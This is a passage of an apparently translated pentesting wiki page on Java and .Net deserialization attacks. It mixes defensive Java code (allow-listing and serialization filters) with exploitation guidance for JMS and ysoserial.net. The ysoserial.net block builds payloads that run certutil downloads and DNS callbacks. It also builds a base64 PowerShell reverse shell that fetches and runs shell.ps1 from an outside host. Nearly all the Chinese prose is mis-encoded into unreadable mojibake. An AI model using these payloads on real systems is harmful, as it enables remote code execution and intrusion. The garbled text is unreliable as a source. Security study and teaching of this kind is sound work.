<li><strong>JMX (Javaç®¡ç†æ‰©å±•)</strong>: JMXåˆ©ç”¨åºåˆ—åŒ–åœ¨ç½‘ç»œä¸Šä¼ è¾“å¯¹è±¡ã€‚</li>
<li><strong>è‡ªå®šä¹‰åè®®</strong>: åœ¨Javaä¸­ï¼Œæ ‡å‡†åšæ³•æ¶‰åŠä¼ è¾“åŸå§‹Javaå¯¹è±¡ï¼Œè¿™å°†åœ¨å³å°†åˆ°æ¥çš„åˆ©ç”¨ç¤ºä¾‹ä¸­æ¼”ç¤ºã€‚</li>
</ul>
<h3 id="prevention"><a class="header" href="#prevention">Prevention</a></h3>
<h4 id="transient-objects"><a class="header" href="#transient-objects">Transient objects</a></h4>
<p>ä¸€ä¸ªå®ç°äº†<code>Serializable</code>çš„ç±»å¯ä»¥å°†ç±»ä¸­ä»»ä½•ä¸åº”è¯¥è¢«åºåˆ—åŒ–çš„å¯¹è±¡å®ç°ä¸º<code>transient</code>ã€‚ä¾‹å¦‚:</p>
<pre><code class="language-java">public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
</code></pre>
<h4 id="é¿å…åºåˆ—åŒ–éœ€è¦å®ç°-serializable-çš„ç±»"><a class="header" href="#é¿å…åºåˆ—åŒ–éœ€è¦å®ç°-serializable-çš„ç±»">é¿å…åºåˆ—åŒ–éœ€è¦å®ç° Serializable çš„ç±»</a></h4>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒæŸäº› <strong>å¯¹è±¡å¿…é¡»å®ç° <code>Serializable</code></strong> æ¥å£ç”±äºç±»å±‚æ¬¡ç»“æ„ï¼Œå­˜åœ¨æ— æ„ååºåˆ—åŒ–çš„é£é™©ã€‚ä¸ºé˜²æ­¢è¿™ç§æƒ…å†µï¼Œç¡®ä¿è¿™äº›å¯¹è±¡ä¸å¯ååºåˆ—åŒ–ï¼Œé€šè¿‡å®šä¹‰ä¸€ä¸ªå§‹ç»ˆæŠ›å‡ºå¼‚å¸¸çš„ <code>final</code> <code>readObject()</code> æ–¹æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-java">private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
</code></pre>
<h4 id="å¢å¼ºjavaä¸­çš„ååºåˆ—åŒ–å®‰å…¨æ€§"><a class="header" href="#å¢å¼ºjavaä¸­çš„ååºåˆ—åŒ–å®‰å…¨æ€§"><strong>å¢å¼ºJavaä¸­çš„ååºåˆ—åŒ–å®‰å…¨æ€§</strong></a></h4>
<p><strong>è‡ªå®šä¹‰ <code>java.io.ObjectInputStream</code></strong> æ˜¯ç¡®ä¿ååºåˆ—åŒ–è¿‡ç¨‹å®‰å…¨çš„å®ç”¨æ–¹æ³•ã€‚å½“æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ—¶ï¼Œæ­¤æ–¹æ³•é€‚ç”¨ï¼š</p>
<ul>
<li>ååºåˆ—åŒ–ä»£ç åœ¨æ‚¨çš„æ§åˆ¶ä¹‹ä¸‹ã€‚</li>
<li>é¢„æœŸååºåˆ—åŒ–çš„ç±»æ˜¯å·²çŸ¥çš„ã€‚</li>
</ul>
<p>é‡å†™ <strong><code>resolveClass()</code></strong> æ–¹æ³•ä»¥é™åˆ¶ååºåˆ—åŒ–ä»…é™äºå…è®¸çš„ç±»ã€‚è¿™å¯ä»¥é˜²æ­¢ååºåˆ—åŒ–ä»»ä½•ç±»ï¼Œé™¤äº†é‚£äº›æ˜ç¡®å…è®¸çš„ç±»ï¼Œä¾‹å¦‚ä»¥ä¸‹ç¤ºä¾‹ä»…é™åˆ¶ååºåˆ—åŒ–ä¸º <code>Bicycle</code> ç±»ï¼š</p>
<pre><code class="language-java">// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
</code></pre>
<p><strong>ä½¿ç”¨ Java Agent å¢å¼ºå®‰å…¨æ€§</strong> æä¾›äº†ä¸€ç§åœ¨æ— æ³•ä¿®æ”¹ä»£ç æ—¶çš„å¤‡ç”¨è§£å†³æ–¹æ¡ˆã€‚æ­¤æ–¹æ³•ä¸»è¦ç”¨äº <strong>é»‘åå•æœ‰å®³ç±»</strong>ï¼Œä½¿ç”¨ JVM å‚æ•°ï¼š</p>
<pre><code>-javaagent:name-of-agent.jar
</code></pre>
<p>å®ƒæä¾›äº†ä¸€ç§åŠ¨æ€ä¿æŠ¤ååºåˆ—åŒ–çš„æ–¹æ³•ï¼Œé€‚ç”¨äºç«‹å³ä»£ç æ›´æ”¹ä¸åˆ‡å®é™…çš„ç¯å¢ƒã€‚</p>
<p>æŸ¥çœ‹ <a href="https://github.com/Contrast-Security-OSS/contrast-rO0">rO0 by Contrast Security</a> ä¸­çš„ç¤ºä¾‹</p>
<p><strong>å®ç°åºåˆ—åŒ–è¿‡æ»¤å™¨</strong>ï¼šJava 9 é€šè¿‡ <strong><code>ObjectInputFilter</code></strong> æ¥å£å¼•å…¥äº†åºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œæä¾›äº†ä¸€ç§å¼ºå¤§çš„æœºåˆ¶ï¼Œç”¨äºæŒ‡å®šååºåˆ—åŒ–ä¹‹å‰åºåˆ—åŒ–å¯¹è±¡å¿…é¡»æ»¡è¶³çš„æ ‡å‡†ã€‚è¿™äº›è¿‡æ»¤å™¨å¯ä»¥å…¨å±€åº”ç”¨æˆ–æŒ‰æµåº”ç”¨ï¼Œæä¾›å¯¹ååºåˆ—åŒ–è¿‡ç¨‹çš„ç»†ç²’åº¦æ§åˆ¶ã€‚</p>
<p>è¦ä½¿ç”¨åºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œæ‚¨å¯ä»¥è®¾ç½®ä¸€ä¸ªé€‚ç”¨äºæ‰€æœ‰ååºåˆ—åŒ–æ“ä½œçš„å…¨å±€è¿‡æ»¤å™¨ï¼Œæˆ–ä¸ºç‰¹å®šæµåŠ¨æ€é…ç½®å®ƒã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="language-java">ObjectInputFilter filter = info -&gt; {
if (info.depth() &gt; MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() &gt; MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null &amp;&amp; !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
</code></pre>
<p><strong>åˆ©ç”¨å¤–éƒ¨åº“å¢å¼ºå®‰å…¨æ€§</strong>ï¼šåƒ<strong>NotSoSerial</strong>ã€<strong>jdeserialize</strong>å’Œ<strong>Kryo</strong>è¿™æ ·çš„åº“æä¾›äº†æ§åˆ¶å’Œç›‘æ§Javaååºåˆ—åŒ–çš„é«˜çº§åŠŸèƒ½ã€‚è¿™äº›åº“å¯ä»¥æä¾›é¢å¤–çš„å®‰å…¨å±‚ï¼Œä¾‹å¦‚ç™½åå•æˆ–é»‘åå•ç±»ã€åœ¨ååºåˆ—åŒ–ä¹‹å‰åˆ†æåºåˆ—åŒ–å¯¹è±¡ï¼Œä»¥åŠå®ç°è‡ªå®šä¹‰åºåˆ—åŒ–ç­–ç•¥ã€‚</p>
<ul>
<li><strong>NotSoSerial</strong> æ‹¦æˆªååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»¥é˜²æ­¢æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ã€‚</li>
<li><strong>jdeserialize</strong> å…è®¸åœ¨ä¸ååºåˆ—åŒ–çš„æƒ…å†µä¸‹åˆ†æåºåˆ—åŒ–çš„Javaå¯¹è±¡ï¼Œå¸®åŠ©è¯†åˆ«æ½œåœ¨çš„æ¶æ„å†…å®¹ã€‚</li>
<li><strong>Kryo</strong> æ˜¯ä¸€ä¸ªæ›¿ä»£çš„åºåˆ—åŒ–æ¡†æ¶ï¼Œå¼ºè°ƒé€Ÿåº¦å’Œæ•ˆç‡ï¼Œæä¾›å¯é…ç½®çš„åºåˆ—åŒ–ç­–ç•¥ï¼Œå¯ä»¥å¢å¼ºå®‰å…¨æ€§ã€‚</li>
</ul>
<h3 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h3>
<ul>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</a></li>
<li>ååºåˆ—åŒ–å’Œysoserialè®²åº§ï¼š<a href="http://frohoff.github.io/appseccali-marshalling-pickles/">http://frohoff.github.io/appseccali-marshalling-pickles/</a></li>
<li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li>
<li><a href="https://www.youtube.com/watch?v=VviY3O-euVQ">https://www.youtube.com/watch?v=VviY3O-euVQ</a></li>
<li>è®²åº§å…³äºgadgetinspectorï¼š<a href="https://www.youtube.com/watch?v=wPbW6zQ52w8">https://www.youtube.com/watch?v=wPbW6zQ52w8</a> å’Œå¹»ç¯ç‰‡ï¼š<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></li>
<li>Marshalsecè®ºæ–‡ï¼š<a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true">https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true</a></li>
<li><a href="https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr">https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr</a></li>
<li><a href="https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html">https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html</a></li>
<li><a href="https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html">https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html</a></li>
<li>Javaå’Œ.Net JSONååºåˆ—åŒ–<strong>è®ºæ–‡ï¼š</strong><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf"><strong>https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf</strong></a>**ï¼Œ**è®²åº§ï¼š<a href="https://www.youtube.com/watch?v=oUAeWhW5b8c">https://www.youtube.com/watch?v=oUAeWhW5b8c</a> å’Œå¹»ç¯ç‰‡ï¼š<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></li>
<li>ååºåˆ—åŒ–CVEï¼š<a href="https://paper.seebug.org/123/">https://paper.seebug.org/123/</a></li>
</ul>
<h2 id="jndiæ³¨å…¥ä¸log4shell"><a class="header" href="#jndiæ³¨å…¥ä¸log4shell">JNDIæ³¨å…¥ä¸log4Shell</a></h2>
<p>æŸ¥æ‰¾ä»€ä¹ˆæ˜¯<strong>JNDIæ³¨å…¥ï¼Œå¦‚ä½•é€šè¿‡RMIã€CORBAå’ŒLDAPæ»¥ç”¨å®ƒï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨log4shell</strong>ï¼ˆä»¥åŠæ­¤æ¼æ´çš„ç¤ºä¾‹ï¼‰åœ¨ä»¥ä¸‹é¡µé¢ï¼š</p>
<p>{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
<a href="jndi-java-naming-and-directory-interface-and-log4shell.html">jndi-java-naming-and-directory-interface-and-log4shell.md</a>
{% endcontent-ref %}</p>
<h2 id="jms---javaæ¶ˆæ¯æœåŠ¡"><a class="header" href="#jms---javaæ¶ˆæ¯æœåŠ¡">JMS - Javaæ¶ˆæ¯æœåŠ¡</a></h2>
<blockquote>
<p><strong>Javaæ¶ˆæ¯æœåŠ¡</strong>ï¼ˆ<strong>JMS</strong>ï¼‰APIæ˜¯ä¸€ä¸ªJavaé¢å‘æ¶ˆæ¯çš„ä¸­é—´ä»¶APIï¼Œç”¨äºåœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªå®¢æˆ·ç«¯ä¹‹é—´å‘é€æ¶ˆæ¯ã€‚å®ƒæ˜¯å¤„ç†ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜çš„å®ç°ã€‚JMSæ˜¯Javaå¹³å°ä¼ä¸šç‰ˆï¼ˆJava EEï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œç”±Sun Microsystemså¼€å‘çš„è§„èŒƒå®šä¹‰ï¼Œä½†æ­¤åç”±Javaç¤¾åŒºè¿‡ç¨‹æŒ‡å¯¼ã€‚å®ƒæ˜¯ä¸€ä¸ªæ¶ˆæ¯æ ‡å‡†ï¼Œå…è®¸åŸºäºJava EEçš„åº”ç”¨ç¨‹åºç»„ä»¶åˆ›å»ºã€å‘é€ã€æ¥æ”¶å’Œè¯»å–æ¶ˆæ¯ã€‚å®ƒå…è®¸åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºçš„ä¸åŒç»„ä»¶ä¹‹é—´çš„é€šä¿¡æ˜¯æ¾è€¦åˆã€å¯é å’Œå¼‚æ­¥çš„ã€‚ï¼ˆæ¥è‡ª<a href="https://en.wikipedia.org/wiki/Java_Message_Service">ç»´åŸºç™¾ç§‘</a>ï¼‰ã€‚</p>
</blockquote>
<h3 id="äº§å“"><a class="header" href="#äº§å“">äº§å“</a></h3>
<p>æœ‰å‡ ä¸ªäº§å“ä½¿ç”¨æ­¤ä¸­é—´ä»¶å‘é€æ¶ˆæ¯ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(314).png" alt="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" /></p>
<p><img src="../../.gitbook/assets/image%20(1056).png" alt="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" /></p>
<h3 id="åˆ©ç”¨-1"><a class="header" href="#åˆ©ç”¨-1">åˆ©ç”¨</a></h3>
<p>æ‰€ä»¥ï¼ŒåŸºæœ¬ä¸Šæœ‰<strong>ä¸€å †æœåŠ¡ä»¥å±é™©çš„æ–¹å¼ä½¿ç”¨JMS</strong>ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æœ‰<strong>è¶³å¤Ÿçš„æƒé™</strong>å‘è¿™äº›æœåŠ¡å‘é€æ¶ˆæ¯ï¼ˆé€šå¸¸æ‚¨éœ€è¦æœ‰æ•ˆçš„å‡­æ®ï¼‰ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿå‘é€<strong>æ¶æ„åºåˆ—åŒ–å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡å°†è¢«æ¶ˆè´¹è€…/è®¢é˜…è€…ååºåˆ—åŒ–</strong>ã€‚<br />
è¿™æ„å‘³ç€åœ¨æ­¤åˆ©ç”¨ä¸­ï¼Œæ‰€æœ‰<strong>å°†ä½¿ç”¨è¯¥æ¶ˆæ¯çš„å®¢æˆ·ç«¯å°†è¢«æ„ŸæŸ“</strong>ã€‚</p>
<p>æ‚¨åº”è¯¥è®°ä½ï¼Œå³ä½¿æœåŠ¡å­˜åœ¨æ¼æ´ï¼ˆå› ä¸ºå®ƒä¸å®‰å…¨åœ°ååºåˆ—åŒ–ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œæ‚¨ä»ç„¶éœ€è¦æ‰¾åˆ°æœ‰æ•ˆçš„gadgetæ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚</p>
<p>å·¥å…·<a href="https://github.com/matthiaskaiser/jmet">JMET</a>è¢«åˆ›å»ºç”¨äº<strong>è¿æ¥å’Œæ”»å‡»è¿™äº›æœåŠ¡ï¼Œå‘é€å¤šä¸ªä½¿ç”¨å·²çŸ¥gadgetåºåˆ—åŒ–çš„æ¶æ„å¯¹è±¡</strong>ã€‚è¿™äº›åˆ©ç”¨å°†åœ¨æœåŠ¡ä»ç„¶å­˜åœ¨æ¼æ´ä¸”ä½¿ç”¨çš„ä»»ä½•gadgetåœ¨æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºä¸­æ—¶æœ‰æ•ˆã€‚</p>
<h3 id="å‚è€ƒæ–‡çŒ®-1"><a class="header" href="#å‚è€ƒæ–‡çŒ®-1">å‚è€ƒæ–‡çŒ®</a></h3>
<ul>
<li>JMETè®²åº§ï¼š<a href="https://www.youtube.com/watch?v=0h8DWiOWGGA">https://www.youtube.com/watch?v=0h8DWiOWGGA</a></li>
<li>å¹»ç¯ç‰‡ï¼š<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf</a></li>
</ul>
<h2 id="net"><a class="header" href="#net">.Net</a></h2>
<p>åœ¨.Netçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œååºåˆ—åŒ–åˆ©ç”¨ä»¥ç±»ä¼¼äºJavaçš„æ–¹å¼æ“ä½œï¼Œå…¶ä¸­gadgetè¢«åˆ©ç”¨ä»¥åœ¨ååºåˆ—åŒ–å¯¹è±¡æ—¶è¿è¡Œç‰¹å®šä»£ç ã€‚</p>
<h3 id="æŒ‡çº¹-1"><a class="header" href="#æŒ‡çº¹-1">æŒ‡çº¹</a></h3>
<h4 id="ç™½ç›’-1"><a class="header" href="#ç™½ç›’-1">ç™½ç›’</a></h4>
<p>åº”æ£€æŸ¥æºä»£ç ä¸­æ˜¯å¦å­˜åœ¨ä»¥ä¸‹å†…å®¹ï¼š</p>
<ol>
<li><code>TypeNameHandling</code></li>
<li><code>JavaScriptTypeResolver</code></li>
</ol>
<p>é‡ç‚¹åº”æ”¾åœ¨å…è®¸é€šè¿‡ç”¨æˆ·æ§åˆ¶çš„å˜é‡ç¡®å®šç±»å‹çš„åºåˆ—åŒ–å™¨ä¸Šã€‚</p>
<h4 id="é»‘ç›’-1"><a class="header" href="#é»‘ç›’-1">é»‘ç›’</a></h4>
<p>æœç´¢åº”é’ˆå¯¹Base64ç¼–ç å­—ç¬¦ä¸²<strong>AAEAAAD/////<strong>æˆ–ä»»ä½•å¯èƒ½åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œååºåˆ—åŒ–çš„ç±»ä¼¼æ¨¡å¼ï¼Œä»è€Œæ§åˆ¶è¦ååºåˆ—åŒ–çš„ç±»å‹ã€‚è¿™å¯èƒ½åŒ…æ‹¬ä½†ä¸é™äºåŒ…å«<code>TypeObject</code>æˆ–<code>$type</code>çš„</strong>JSON</strong>æˆ–<strong>XML</strong>ç»“æ„ã€‚</p>
<h3 id="ysoserialnet"><a class="header" href="#ysoserialnet">ysoserial.net</a></h3>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·<a href="https://github.com/pwntester/ysoserial.net"><strong>ysoserial.net</strong></a>æ¥<strong>åˆ›å»ºååºåˆ—åŒ–åˆ©ç”¨</strong>ã€‚ä¸‹è½½gitå­˜å‚¨åº“åï¼Œæ‚¨åº”è¯¥<strong>ä½¿ç”¨Visual Studioç­‰ç¼–è¯‘è¯¥å·¥å…·</strong>ã€‚</p>
<p>å¦‚æœæ‚¨æƒ³äº†è§£<strong>ysoserial.netæ˜¯å¦‚ä½•åˆ›å»ºå…¶åˆ©ç”¨çš„</strong>ï¼Œæ‚¨å¯ä»¥<a href="basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.html"><strong>æŸ¥çœ‹æ­¤é¡µé¢ï¼Œå…¶ä¸­è§£é‡Šäº†ObjectDataProvider gadget + ExpandedWrapper + Json.Netæ ¼å¼åŒ–ç¨‹åº</strong></a>ã€‚</p>
<p><strong>ysoserial.net</strong>çš„ä¸»è¦é€‰é¡¹æœ‰ï¼š<strong><code>--gadget</code></strong>ã€<strong><code>--formatter</code></strong>ã€<strong><code>--output</code><strong>å’Œ</strong><code>--plugin</code></strong>ã€‚</p>
<ul>
<li>**<code>--gadget</code>**ç”¨äºæŒ‡ç¤ºè¦æ»¥ç”¨çš„gadgetï¼ˆæŒ‡ç¤ºåœ¨ååºåˆ—åŒ–æœŸé—´å°†è¢«æ»¥ç”¨ä»¥æ‰§è¡Œå‘½ä»¤çš„ç±»/å‡½æ•°ï¼‰ã€‚</li>
<li><strong><code>--formatter</code></strong>ï¼Œç”¨äºæŒ‡ç¤ºåºåˆ—åŒ–åˆ©ç”¨çš„æ–¹æ³•ï¼ˆæ‚¨éœ€è¦çŸ¥é“åç«¯ä½¿ç”¨å“ªä¸ªåº“æ¥ååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶ä½¿ç”¨ç›¸åŒçš„åº“è¿›è¡Œåºåˆ—åŒ–ï¼‰</li>
<li><strong><code>--output</code><strong>ç”¨äºæŒ‡ç¤ºæ‚¨æ˜¯å¦å¸Œæœ›ä»¥</strong>åŸå§‹</strong>æˆ–<strong>base64</strong>ç¼–ç çš„å½¢å¼è·å¾—åˆ©ç”¨ã€‚<em>è¯·æ³¨æ„ï¼Œ<strong>ysoserial.net</strong>å°†ä½¿ç”¨<strong>UTF-16LE</strong>ï¼ˆWindowsä¸Šé»˜è®¤ä½¿ç”¨çš„ç¼–ç ï¼‰å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œ<strong>ç¼–ç ï¼Œå› æ­¤å¦‚æœæ‚¨ä»Linuxæ§åˆ¶å°è·å–åŸå§‹æ•°æ®å¹¶ä»…å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œæ‚¨å¯èƒ½ä¼šé‡åˆ°ä¸€äº›</strong>ç¼–ç å…¼å®¹æ€§é—®é¢˜**ï¼Œè¿™å°†é˜»æ­¢åˆ©ç”¨æ­£å¸¸å·¥ä½œï¼ˆåœ¨HTB JSONæ¡†ä¸­ï¼Œæœ‰æ•ˆè´Ÿè½½åœ¨UTF-16LEå’ŒASCIIä¸­å‡æœ‰æ•ˆï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€å®ƒæ€»æ˜¯æœ‰æ•ˆï¼‰ã€‚</em></li>
<li><strong><code>--plugin</code></strong> ysoserial.netæ”¯æŒæ’ä»¶ä»¥åˆ¶ä½œ<strong>ç‰¹å®šæ¡†æ¶çš„åˆ©ç”¨</strong>ï¼Œå¦‚ViewState</li>
</ul>
<h4 id="æ›´å¤šysoserialnetå‚æ•°"><a class="header" href="#æ›´å¤šysoserialnetå‚æ•°">æ›´å¤šysoserial.netå‚æ•°</a></h4>
<ul>
<li><code>--minify</code>å°†æä¾›ä¸€ä¸ª<strong>æ›´å°çš„æœ‰æ•ˆè´Ÿè½½</strong>ï¼ˆå¦‚æœå¯èƒ½ï¼‰</li>
<li><code>--raf -f Json.Net -c "anything"</code>è¿™å°†æŒ‡ç¤ºå¯ä»¥ä¸æä¾›çš„æ ¼å¼åŒ–ç¨‹åºï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸º<code>Json.Net</code>ï¼‰ä¸€èµ·ä½¿ç”¨çš„æ‰€æœ‰gadget</li>
<li><code>--sf xml</code>æ‚¨å¯ä»¥<strong>æŒ‡ç¤ºä¸€ä¸ªgadget</strong>ï¼ˆ<code>-g</code>ï¼‰ï¼Œysoserial.netå°†æœç´¢åŒ…å«â€œxmlâ€çš„æ ¼å¼åŒ–ç¨‹åºï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</li>
</ul>
<p><strong>ysoserialç¤ºä¾‹</strong>ä»¥åˆ›å»ºåˆ©ç”¨ï¼š</p>
<pre><code class="language-bash">#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
</code></pre>
<p><strong>ysoserial.net</strong> è¿˜æœ‰ä¸€ä¸ª <strong>éå¸¸æœ‰è¶£çš„å‚æ•°</strong>ï¼Œå¯ä»¥å¸®åŠ©æ›´å¥½åœ°ç†è§£æ¯ä¸ªæ¼æ´æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼š <code>--test</code><br />
å¦‚æœæ‚¨æŒ‡å®šæ­¤å‚æ•°ï¼Œ<strong>ysoserial.net</strong> å°† <strong>å°è¯•</strong> åœ¨ <strong>æœ¬åœ°åˆ©ç”¨æ¼æ´ï¼Œ</strong> è¿™æ ·æ‚¨å°±å¯ä»¥æµ‹è¯•æ‚¨çš„æœ‰æ•ˆè½½è·æ˜¯å¦èƒ½æ­£å¸¸å·¥ä½œã€‚<br />
è¿™ä¸ªå‚æ•°å¾ˆæœ‰å¸®åŠ©ï¼Œå› ä¸ºå¦‚æœæ‚¨æŸ¥çœ‹ä»£ç ï¼Œæ‚¨ä¼šå‘ç°åƒä»¥ä¸‹ä»£ç å—ï¼ˆæ¥è‡ª <a href="https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208">ObjectDataProviderGenerator.cs</a>ï¼‰ï¼š</p>
<pre><code class="language-java">if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
</code></pre>
<p>è¿™æ„å‘³ç€ä¸ºäº†æµ‹è¯•æ¼æ´ï¼Œä»£ç å°†è°ƒç”¨ <a href="https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539">serializersHelper.JsonNet_deserialize</a></p>
<pre><code class="language-java">public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject&lt;Object&gt;(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
</code></pre>
<p>åœ¨<strong>ä¹‹å‰çš„ä»£ç ä¸­å­˜åœ¨å¯è¢«åˆ©ç”¨çš„æ¼æ´</strong>ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨åœ¨ .Net åº”ç”¨ç¨‹åºä¸­å‘ç°ç±»ä¼¼çš„å†…å®¹ï¼Œè¿™æ„å‘³ç€è¯¥åº”ç”¨ç¨‹åºå¯èƒ½ä¹Ÿå­˜åœ¨æ¼æ´ã€‚<br />
å› æ­¤ï¼Œ<strong><code>--test</code></strong> å‚æ•°ä½¿æˆ‘ä»¬èƒ½å¤Ÿç†è§£<strong>å“ªäº›ä»£ç å—æ˜“å—</strong> <strong>ysoserial.net</strong> å¯ä»¥åˆ›å»ºçš„ååºåˆ—åŒ–æ¼æ´çš„å½±å“ã€‚</p>
<h3 id="viewstate"><a class="header" href="#viewstate">ViewState</a></h3>
<p>æŸ¥çœ‹<a href="exploiting-__viewstate-parameter.html">è¿™ç¯‡å…³äº<strong>å¦‚ä½•å°è¯•åˆ©ç”¨ .Net çš„ __ViewState å‚æ•°</strong></a>ä»¥<strong>æ‰§è¡Œä»»æ„ä»£ç </strong>ã€‚å¦‚æœæ‚¨<strong>å·²ç»çŸ¥é“å—å®³è€…æœºå™¨ä½¿ç”¨çš„ç§˜å¯†</strong>ï¼Œ<a href="exploiting-__viewstate-knowing-the-secret.html"><strong>é˜…è¯»è¿™ç¯‡æ–‡ç« ä»¥äº†è§£å¦‚ä½•æ‰§è¡Œä»£ç </strong></a><strong>ã€‚</strong></p>
<h3 id="prevention-1"><a class="header" href="#prevention-1">Prevention</a></h3>
